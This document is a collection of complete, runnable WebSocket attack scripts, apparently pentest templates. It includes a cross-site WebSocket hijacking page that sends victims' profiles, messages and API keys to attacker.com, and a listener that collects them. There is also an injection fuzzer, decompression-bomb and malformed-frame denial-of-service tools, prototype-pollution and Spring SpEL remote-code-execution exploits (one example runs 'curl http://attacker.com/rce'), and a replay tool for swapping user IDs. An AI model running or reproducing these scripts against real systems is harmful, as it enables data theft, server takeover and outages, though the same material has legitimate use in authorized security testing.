# PoC & Exploit Scripts — Complete Runnable Templates

All scripts require: `pip install websockets`
Socket.IO scripts also require: `pip install python-socketio[asyncio]`

---

## 1. CSWSH — Browser-Side Exploit Page

Save as `cswsh_poc.html` and serve from attacker-controlled domain.
Victim must have an active authenticated session on target.

```html
<!DOCTYPE html>
<html>
<head>
<title>Loading...</title>
<style>body{background:#f0f0f0;font-family:sans-serif;}</style>
</head>
<body>
<h1>Please wait...</h1>
<script>
(function() {
  var TARGET_WS  = "wss://victim.com/ws";
  var EXFIL_URL  = "https://attacker.com/collect";
  var INIT_MSGS  = [
    JSON.stringify({"action": "get_profile"}),
    JSON.stringify({"action": "list_messages"}),
    JSON.stringify({"action": "get_api_key"}),
  ];
  
  var ws = new WebSocket(TARGET_WS);
  var data_collected = [];
  
  ws.onopen = function() {
    INIT_MSGS.forEach(function(msg) { ws.send(msg); });
  };
  
  ws.onmessage = function(evt) {
    data_collected.push({ts: Date.now(), data: evt.data});
    
    // Exfil via fetch (no-cors to avoid preflight issues)
    fetch(EXFIL_URL, {
      method: "POST",
      body: JSON.stringify({source: "ws", payload: evt.data}),
      mode: "no-cors"
    });
    
    // Fallback: image beacon (works even with strict CSP)
    new Image().src = EXFIL_URL + "?d=" + encodeURIComponent(evt.data.substring(0, 2000));
  };
  
  ws.onerror = function(e) {
    new Image().src = EXFIL_URL + "?err=" + encodeURIComponent(e.type);
  };
  
  // Keep connection alive, collect passive push notifications
  setInterval(function() {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({"action": "ping"}));
    }
  }, 10000);
})();
</script>
</body>
</html>
```

---

## 2. CSWSH Python Listener / Exfil Collector

```python
#!/usr/bin/env python3
"""
CSWSH Exfil Listener
Receives data from the CSWSH browser exploit page.
Run: python3 cswsh_listener.py --port 8888
"""
import argparse, json, datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

COLLECTED = []

class ExfilHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
    
    def do_GET(self):
        params = parse_qs(urlparse(self.path).query)
        data = params.get("d", params.get("err", [""]))[0]
        self._log_and_save(data, "GET beacon")
        self._respond()
    
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        self._log_and_save(body, "POST fetch")
        self._respond()
    
    def _log_and_save(self, data, method):
        ts = datetime.datetime.now().isoformat()
        entry = {"timestamp": ts, "method": method, "data": data}
        COLLECTED.append(entry)
        
        print(f"\n{'='*60}")
        print(f"[{ts}] {method}")
        try:
            parsed = json.loads(data)
            print(json.dumps(parsed, indent=2))
        except Exception:
            print(data[:500])
        
        with open("exfil_log.jsonl", "a") as f:
            f.write(json.dumps(entry) + "\n")
    
    def _respond(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, *args):
        pass

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8888)
    args = ap.parse_args()
    print(f"[*] CSWSH Exfil Listener on :{args.port}")
    print(f"[*] Logging to exfil_log.jsonl")
    HTTPServer(("0.0.0.0", args.port), ExfilHandler).serve_forever()
```

---

## 3. Async Message Fuzzer

```python
#!/usr/bin/env python3
"""
Async WebSocket Message Fuzzer
Tests all fields in a JSON message for injection vulnerabilities.

Usage:
  python3 async_fuzzer.py --uri wss://target.com/ws \
    --template '{"action":"search","q":"FUZZ"}' \
    --cookie "session=TOKEN"
"""
import asyncio, websockets, json, argparse, sys

INJECTION_PAYLOADS = [
    # SQLi
    "1 OR 1=1--", "' OR '1'='1", "1; DROP TABLE users--",
    "1 UNION SELECT null,null,null--", "' WAITFOR DELAY '0:0:5'--",
    "1 AND SLEEP(5)--", "1 AND (SELECT * FROM (SELECT SLEEP(5))a)--",
    # XSS
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "javascript:alert(1)", "<svg onload=alert(1)>",
    # SSTI
    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config.items()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    # Path traversal
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    # Command injection
    "| id", "; id;", "$(id)", "`id`", "&& id",
    # Prototype pollution
    '{"__proto__":{"admin":true}}', '{"constructor":{"prototype":{"admin":true}}}',
    # Size limits
    "A" * 65536, "A" * 1048576,
    # Special chars
    "\x00", "\x00\x00\x00", "null", "undefined",
    # XXE (for XML consumers)
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/passwd">]><x>&x;</x>',
]

async def fuzz_field(uri, template: dict, field: str, cookie: str = ""):
    headers = {}
    if cookie:
        headers["Cookie"] = cookie
    
    findings = []
    
    try:
        async with websockets.connect(uri, additional_headers=headers, open_timeout=10) as ws:
            print(f"[*] Connected. Fuzzing field: '{field}'")
            
            for payload in INJECTION_PAYLOADS:
                msg = dict(template)
                msg[field] = payload
                
                try:
                    await ws.send(json.dumps(msg))
                    resp = await asyncio.wait_for(ws.recv(), timeout=5.0)
                    
                    # Heuristic: interesting responses
                    interesting = any(kw in resp.lower() for kw in [
                        "error", "exception", "stack", "sql", "syntax",
                        "column", "table", "select", "mysql", "postgres",
                        "oracle", "traceback", "errno", "uid=", "root:",
                        "49",  # {{7*7}} = 49
                    ])
                    
                    status = "[!!!] INTERESTING" if interesting else "[ . ]"
                    print(f"{status} {payload[:50]!r} => {resp[:150]!r}")
                    
                    if interesting:
                        findings.append({"payload": payload, "response": resp})
                
                except asyncio.TimeoutError:
                    print(f"[T/O] {payload[:50]!r}")
                except websockets.ConnectionClosed:
                    print(f"[CLOSED] Server closed connection on: {payload[:50]!r}")
                    findings.append({"payload": payload, "response": "CONNECTION_CLOSED"})
                    break
    
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
    
    if findings:
        print(f"\n[!!!] {len(findings)} INTERESTING FINDINGS:")
        for f in findings:
            print(f"  Payload: {f['payload'][:80]!r}")
            print(f"  Response: {f['response'][:200]!r}\n")
    
    return findings

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--uri", required=True)
    ap.add_argument("--template", required=True, help='JSON string e.g. {"action":"search","q":"FUZZ"}')
    ap.add_argument("--field", default="q")
    ap.add_argument("--cookie", default="")
    args = ap.parse_args()
    
    template = json.loads(args.template)
    asyncio.run(fuzz_field(args.uri, template, args.field, args.cookie))
```

---

## 4. Race Condition Tester

```python
#!/usr/bin/env python3
"""
WebSocket Race Condition Tester
Opens N concurrent connections and sends the same state-changing message simultaneously.

Usage:
  python3 race_condition.py --uri wss://target.com/ws \
    --message '{"action":"redeem_coupon","code":"PROMO50"}' \
    --cookie "session=TOKEN" \
    --threads 20
"""
import asyncio, websockets, json, argparse, time

async def race_worker(worker_id: int, uri: str, message: str, cookie: str, 
                       barrier: asyncio.Barrier, results: list):
    headers = {"Cookie": cookie} if cookie else {}
    try:
        async with websockets.connect(uri, additional_headers=headers) as ws:
            # All workers wait here until all are connected
            await barrier.wait()
            
            # Fire simultaneously
            send_time = time.perf_counter()
            await ws.send(message)
            
            resp = await asyncio.wait_for(ws.recv(), timeout=10.0)
            recv_time = time.perf_counter()
            
            result = {
                "worker": worker_id,
                "response": resp,
                "latency_ms": (recv_time - send_time) * 1000,
            }
            results.append(result)
            print(f"[Worker {worker_id:02d}] {resp[:150]!r}  ({result['latency_ms']:.1f}ms)")
    
    except asyncio.TimeoutError:
        results.append({"worker": worker_id, "response": "TIMEOUT", "latency_ms": -1})
        print(f"[Worker {worker_id:02d}] TIMEOUT")
    except Exception as e:
        results.append({"worker": worker_id, "response": f"ERROR: {e}", "latency_ms": -1})
        print(f"[Worker {worker_id:02d}] ERROR: {e}")

async def race(uri: str, message: str, cookie: str, n_threads: int):
    print(f"[*] Launching {n_threads} concurrent connections to {uri}")
    print(f"[*] Message: {message[:100]!r}")
    
    results = []
    barrier = asyncio.Barrier(n_threads)
    
    await asyncio.gather(*[
        race_worker(i, uri, message, cookie, barrier, results)
        for i in range(n_threads)
    ])
    
    print(f"\n[*] Results summary ({len(results)} responses):")
    # Group unique responses
    resp_counts = {}
    for r in results:
        key = r["response"][:100]
        resp_counts[key] = resp_counts.get(key, 0) + 1
    
    for resp, count in sorted(resp_counts.items(), key=lambda x: -x[1]):
        print(f"  {count}x: {resp!r}")
    
    return results

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--uri", required=True)
    ap.add_argument("--message", required=True)
    ap.add_argument("--cookie", default="")
    ap.add_argument("--threads", type=int, default=10)
    args = ap.parse_args()
    
    asyncio.run(race(args.uri, args.message, args.cookie, args.threads))
```

---

## 5. Zlib Bomb Generator

```python
#!/usr/bin/env python3
"""
WebSocket Zlib Bomb — permessage-deflate Decompression DoS
Requires server to have negotiated permessage-deflate extension.

Usage:
  python3 zlib_bomb.py --uri wss://target.com/ws --size-mb 100
"""
import asyncio, websockets, argparse, sys
from websockets.extensions.permessage_deflate import ClientPerMessageDeflateFactory

async def zlib_bomb(uri: str, size_mb: int, cookie: str = ""):
    headers = {"Cookie": cookie} if cookie else {}
    
    bomb_size = size_mb * 1024 * 1024
    bomb_data = b"A" * bomb_size
    
    print(f"[*] Connecting to {uri}")
    print(f"[*] Bomb: {size_mb}MB uncompressed")
    
    try:
        async with websockets.connect(
            uri,
            additional_headers=headers,
            extensions=[ClientPerMessageDeflateFactory()],
        ) as ws:
            extensions = getattr(ws, 'extensions', [])
            has_deflate = any('deflate' in str(e) for e in extensions)
            
            if not has_deflate:
                print("[!] WARNING: permessage-deflate not negotiated — bomb may not compress")
                ans = input("Continue anyway? [y/N]: ")
                if ans.lower() != "y":
                    return
            
            print(f"[*] Sending {size_mb}MB decompression bomb...")
            await ws.send(bomb_data)
            
            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=10.0)
                print(f"[?] Server survived. Response: {resp!r[:200]}")
            except asyncio.TimeoutError:
                print("[!] Server stopped responding — possible OOM/crash")
            except websockets.ConnectionClosed as e:
                print(f"[!] Server closed connection: {e.code} {e.reason}")
    
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--uri", required=True)
    ap.add_argument("--size-mb", type=int, default=10)
    ap.add_argument("--cookie", default="")
    args = ap.parse_args()
    asyncio.run(zlib_bomb(args.uri, args.size_mb, args.cookie))
```

---

## 6. Ping of Death — Malformed Frame OOM (Java WS)

```python
#!/usr/bin/env python3
"""
WebSocket Ping of Death
Sends a frame with payload_length=Integer.MAX_VALUE but no actual payload.
Confirmed to crash Java WebSocket implementations (Zakhar Fedotkin / PortSwigger Research 2025).

Usage:
  python3 ping_of_death.py --host target.com --port 443 --path /ws
"""
import socket, ssl, argparse, sys

def do_ws_upgrade(conn, host, path, extra_headers=""):
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        f"{extra_headers}"
        "\r\n"
    ).encode()
    conn.sendall(req)
    resp = conn.recv(4096)
    return resp

def craft_poison_frame() -> bytes:
    """
    Binary frame (0x82), MASK=1, payload_length=127 (8-byte extended).
    Extended length field = 2147483647 (Integer.MAX_VALUE).
    No payload bytes. Mask key = 0xDEADBEEF.
    """
    mask_key = b"\xDE\xAD\xBE\xEF"
    
    frame = bytes([
        0x82,   # FIN=1, opcode=binary(2)
        0xFF,   # MASK=1, payload_len=127 → 8-byte extended length follows
    ])
    # 8-byte big-endian: Integer.MAX_VALUE = 2147483647 = 0x000000007FFFFFFF
    frame += (2147483647).to_bytes(8, byteorder="big")
    frame += mask_key
    # Intentionally zero payload bytes — length/payload mismatch
    return frame

def ping_of_death(host: str, port: int, path: str, cookie: str = ""):
    extra = f"Cookie: {cookie}\r\n" if cookie else ""
    
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(10)
    raw.connect((host, port))
    
    if port in (443, 8443):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        conn = ctx.wrap_socket(raw, server_hostname=host)
    else:
        conn = raw
    
    resp = do_ws_upgrade(conn, host, path, extra)
    
    if b"101" not in resp:
        print(f"[!] Upgrade failed:\n{resp.decode(errors='replace')}", file=sys.stderr)
        sys.exit(1)
    
    print("[+] WebSocket upgrade successful")
    print("[*] Sending Ping of Death frame (payload_length=2147483647, 0 bytes actual)...")
    
    conn.sendall(craft_poison_frame())
    
    try:
        data = conn.recv(4096)
        if data:
            print(f"[?] Server responded: {data[:200]!r}")
        else:
            print("[!!!] Server closed connection — possible crash (check server logs)")
    except socket.timeout:
        print("[!!!] Timeout — server may be unresponsive (OOM crash likely)")
    except ConnectionResetError:
        print("[!!!] Connection reset — server crashed")
    finally:
        conn.close()

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--path", default="/ws")
    ap.add_argument("--cookie", default="")
    args = ap.parse_args()
    ping_of_death(args.host, args.port, args.path, args.cookie)
```

---

## 7. Socket.IO Prototype Pollution Tester

```python
#!/usr/bin/env python3
"""
Socket.IO Server-Side Prototype Pollution Tester
Technique: Zakhar Fedotkin / PortSwigger Research (2025)
Based on Gareth Heyes black-box SSPP detection.

Usage:
  python3 socketio_polluter.py --uri wss://target.com/socket.io/ \
    --cookie "session=TOKEN"
"""
import asyncio, websockets, json, argparse

PP_PAYLOADS = [
    {"__proto__": {"initialPacket": "POLLUTED_GREETING"}},
    {"__proto__": {"admin": True}},
    {"__proto__": {"role": "admin"}},
    {"__proto__": {"isAdmin": True}},
    {"__proto__": {"debug": True}},
    {"__proto__": {"x-powered-by": "POLLUTED_HEADER"}},
    {"constructor": {"prototype": {"admin": True}}},
    {"__proto__": {"outputFunctionName": "a; return process.mainModule.require('child_process').execSync('id').toString(); //"}},
]

async def test_pollution(uri: str, cookie: str = ""):
    ws_uri = uri
    if "?" not in ws_uri:
        ws_uri += "?EIO=4&transport=websocket"
    
    headers = {"Cookie": cookie} if cookie else {}
    
    async with websockets.connect(ws_uri, additional_headers=headers) as ws:
        # Socket.IO open packet
        open_pkt = await ws.recv()
        print(f"[OPEN] {open_pkt}")
        
        # Connect to namespace /
        await ws.send("40")
        connect_resp = await ws.recv()
        print(f"[CONNECT] {connect_resp}")
        
        # Baseline — capture normal behavior
        await ws.send('42["message","baseline_test"]')
        try:
            baseline = await asyncio.wait_for(ws.recv(), timeout=3.0)
            print(f"[BASELINE] {baseline}")
        except asyncio.TimeoutError:
            baseline = None
        
        for payload in PP_PAYLOADS:
            # Wrap payload as Socket.IO event
            event_msg = f'42["message",{json.dumps(payload)}]'
            await ws.send(event_msg)
            print(f"\n[SENT] {event_msg[:120]}")
            
            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=3.0)
                print(f"[RESP] {resp}")
                
                # Check if behavior changed from baseline
                if baseline and resp != baseline:
                    print(f"[!!!] BEHAVIOR CHANGE DETECTED!")
                    print(f"      Baseline: {baseline!r}")
                    print(f"      After PP: {resp!r}")
                    print(f"      Payload: {json.dumps(payload)}")
                
                if any(kw in resp for kw in ["POLLUTED", "admin", "true", "debug"]):
                    print(f"[!!!] POTENTIAL POLLUTION CONFIRMED")
            
            except asyncio.TimeoutError:
                print("[TIMEOUT]")
            
            # Handle keepalive pings
            try:
                ping = await asyncio.wait_for(ws.recv(), timeout=1.0)
                if ping == "2":
                    await ws.send("3")
            except asyncio.TimeoutError:
                pass

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--uri", required=True)
    ap.add_argument("--cookie", default="")
    args = ap.parse_args()
    asyncio.run(test_pollution(args.uri, args.cookie))
```

---

## 8. STOMP SpEL Injection PoC

```python
#!/usr/bin/env python3
"""
STOMP SpEL Injection PoC (CVE-2018-1270 pattern)
Target: Spring Framework STOMP over WebSocket with vulnerable selector evaluation.

Usage:
  python3 stomp_exploit.py --uri wss://target.com/ws \
    --destination /topic/public \
    --cmd "curl http://attacker.com/rce"
"""
import asyncio, websockets, argparse, urllib.parse

STOMP_SPEL_TEMPLATES = [
    # DNS callback — blind detection
    'T(java.net.InetAddress).getByName("{callback}")',
    # RCE — execute command
    'T(java.lang.Runtime).getRuntime().exec("{cmd}")',
    # RCE with output (for scanner/OAST)
    'new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("{cmd}").getInputStream()).useDelimiter("\\A").next()',
    # File read
    'new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()',
    # Class loading
    'T(java.lang.Thread).currentThread().getContextClassLoader().loadClass("{class}")',
]

def build_stomp_frame(command: str, headers: dict, body: str = "") -> str:
    frame = command + "\n"
    for k, v in headers.items():
        frame += f"{k}:{v}\n"
    frame += "\n"
    frame += body
    frame += "\x00"
    return frame

async def stomp_exploit(uri: str, destination: str, cmd: str, callback: str = ""):
    async with websockets.connect(uri) as ws:
        # CONNECT
        connect = build_stomp_frame("CONNECT", {
            "accept-version": "1.2",
            "heart-beat": "0,0",
        })
        await ws.send(connect)
        resp = await ws.recv()
        print(f"[STOMP CONNECTED] {resp!r}")
        
        if "ERROR" in resp:
            print("[!] STOMP auth required")
            return
        
        for template in STOMP_SPEL_TEMPLATES:
            if "{callback}" in template:
                if not callback:
                    continue
                spel = template.replace("{callback}", callback)
            else:
                spel = template.replace("{cmd}", cmd.replace('"', '\\"'))
            
            subscribe = build_stomp_frame("SUBSCRIBE", {
                "destination": destination,
                "id": "sub-exploit",
                "selector": spel,
            })
            
            print(f"\n[*] Sending SpEL: {spel[:100]}")
            await ws.send(subscribe)
            
            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=5.0)
                print(f"[<] {resp!r}")
            except asyncio.TimeoutError:
                print("[TIMEOUT] — check your OAST/callback server")
            
            # Unsubscribe before next attempt
            unsub = build_stomp_frame("UNSUBSCRIBE", {"id": "sub-exploit"})
            await ws.send(unsub)

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--uri", required=True)
    ap.add_argument("--destination", default="/topic/public")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--callback", default="", help="OAST/DNS callback domain")
    args = ap.parse_args()
    asyncio.run(stomp_exploit(args.uri, args.destination, args.cmd, args.callback))
```

---

## 9. Message Replay with Mutation

```python
#!/usr/bin/env python3
"""
WebSocket Message Replay Tool
Captures N messages then replays them with optional mutations.

Usage:
  python3 message_replay.py --uri wss://target.com/ws \
    --cookie "session=TOKEN" \
    --capture 30 \
    --mutate-field user_id \
    --mutate-value VICTIM_ID
"""
import asyncio, websockets, json, argparse, time

async def capture_and_replay(uri: str, cookie: str, capture_secs: int,
                              mutate_field: str = "", mutate_value: str = ""):
    headers = {"Cookie": cookie} if cookie else {}
    captured = []
    
    # Phase 1: Capture
    print(f"[*] Capturing for {capture_secs}s...")
    async with websockets.connect(uri, additional_headers=headers) as ws:
        start = time.time()
        while time.time() - start < capture_secs:
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=1.0)
                captured.append({"ts": time.time() - start, "msg": msg})
                print(f"[CAPTURE] t={time.time()-start:.1f}s {msg!r[:80]}")
            except asyncio.TimeoutError:
                pass
    
    print(f"\n[*] Captured {len(captured)} messages. Replaying with mutations...")
    
    # Phase 2: Replay with mutations
    async with websockets.connect(uri, additional_headers=headers) as ws:
        for item in captured:
            msg = item["msg"]
            
            if mutate_field:
                try:
                    data = json.loads(msg)
                    if mutate_field in data:
                        original = data[mutate_field]
                        data[mutate_field] = mutate_value
                        msg = json.dumps(data)
                        print(f"[MUTATE] {mutate_field}: {original!r} → {mutate_value!r}")
                except json.JSONDecodeError:
                    pass
            
            await ws.send(msg)
            print(f"[REPLAY] {msg!r[:80]}")
            
            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=3.0)
                print(f"[RESPONSE] {resp!r[:150]}")
            except asyncio.TimeoutError:
                print("[NO_RESPONSE]")

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--uri", required=True)
    ap.add_argument("--cookie", default="")
    ap.add_argument("--capture", type=int, default=30)
    ap.add_argument("--mutate-field", default="")
    ap.add_argument("--mutate-value", default="")
    args = ap.parse_args()
    asyncio.run(capture_and_replay(
        args.uri, args.cookie, args.capture,
        args.mutate_field, args.mutate_value
    ))
```
